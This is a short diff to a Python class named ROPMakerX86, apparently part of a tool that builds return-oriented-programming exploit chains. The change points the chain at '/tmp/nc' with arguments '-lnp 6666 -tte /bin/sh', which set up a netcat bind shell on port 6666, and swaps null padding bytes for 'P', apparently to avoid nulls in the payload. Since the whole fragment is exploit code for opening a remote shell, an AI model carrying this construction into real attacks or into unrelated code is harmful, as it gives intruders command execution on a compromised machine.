@@ -173,9 +173,9 @@ class ROPMakerX86(object):
         """
 
 
-        filename = "/bin//nc"
+        filename = "/tmp/nc"
         # [filename, arg1, arg2, ...]
-        args = [filename, '-lnp', '6666', '-tte', '/bin//sh']
+        args = [filename, '-lnp', '6666', '-tte', '/bin/sh']
         argPointers = []
 
         env = []
@@ -208,7 +208,7 @@ class ROPMakerX86(object):
                 # Force chunk to be full word, otherwise instructions become offset on stack
                 if len(chunk) % 4 != 0:
                     # for i in range(4 - len(chunk) % 4)
-                    chunkBytes += bytes('\0', 'ascii') * (4 - (len(chunk) % 4))
+                    chunkBytes += bytes('P', 'ascii') * (4 - (len(chunk) % 4))
 
                 print(i)
                 print(chunk)
